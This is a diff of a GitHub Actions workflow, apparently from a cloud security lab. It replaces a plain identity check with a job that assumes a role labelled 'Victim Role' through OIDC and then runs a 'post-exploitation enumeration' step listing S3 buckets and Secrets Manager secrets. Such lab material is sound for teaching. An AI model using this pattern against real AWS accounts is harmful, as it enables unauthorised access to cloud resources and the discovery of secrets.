@@ -10,18 +10,17 @@ permissions:
   contents: read # needed for private repos to checkout
 
 jobs:
-  aws:
+  assume-role:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v3
-
-      - name: Configure AWS Credentials
-        uses: aws-actions/configure-aws-credentials@v1
+      - name: Assume Victim Role
+        uses: aws-actions/configure-aws-credentials@v4
         with:
+          role-to-assume: arn:aws:iam::620483490609:role/whitebox-lab-2-github-actions-role
           aws-region: us-east-1
-          role-to-assume: arn:aws:iam::620483490609:role/sts-lab-2-target
-          role-session-name: OIDCSession
 
-      - run: aws sts get-caller-identity
-        shell: bash
+      - name: Post-Exploitation Enumeration
+        run: |
+          aws sts get-caller-identity
+          aws s3 ls
+          aws secretsmanager list-secrets
